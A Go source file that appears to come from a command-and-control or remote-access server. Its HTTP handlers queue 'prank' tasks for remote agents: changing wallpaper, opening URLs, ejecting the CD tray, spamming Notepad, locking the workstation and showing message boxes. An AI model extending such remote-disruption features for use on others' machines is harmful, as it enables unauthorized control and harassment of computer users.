package server

import "github.com/gin-gonic/gin"

// ── Disruption / Prank Command Handlers ─────────────────────────────────────
// These handlers send lighthearted disruption tasks to agents.
// They are separated from core operational handlers for clarity.

func (s *Server) handleWallpaperChange(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType: "wallpaper_change",
		audit:    "wallpaper_change",
		required: true,
	})
}

func (s *Server) handlePlaySound(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType: "play_sound",
		audit:    "play_sound",
		required: true,
	})
}

func (s *Server) handleOpenURL(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType: "open_url",
		audit:    "open_url",
		required: true,
	})
}

func (s *Server) handleCDRomTray(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType: "cdrom_tray",
		audit:    "cdrom_tray",
		required: true,
	})
}

func (s *Server) handleNotepadSpam(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType:     "notepad_spam",
		audit:        "notepad_spam",
		defaultValue: "5",
	})
}

func (s *Server) handleSetVolume(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType: "set_volume",
		audit:    "set_volume",
		required: true,
	})
}

func (s *Server) handleScreenRotate(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"screen_rotate", "screen_rotate", ""})
}

func (s *Server) handleLockWorkstation(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"lock_workstation", "lock_workstation", ""})
}

func (s *Server) handleCursorFlip(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"cursor_flip", "cursor_flip", ""})
}

func (s *Server) handleMsgBox(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType: "msgbox",
		audit:    "msgbox",
		required: true,
	})
}
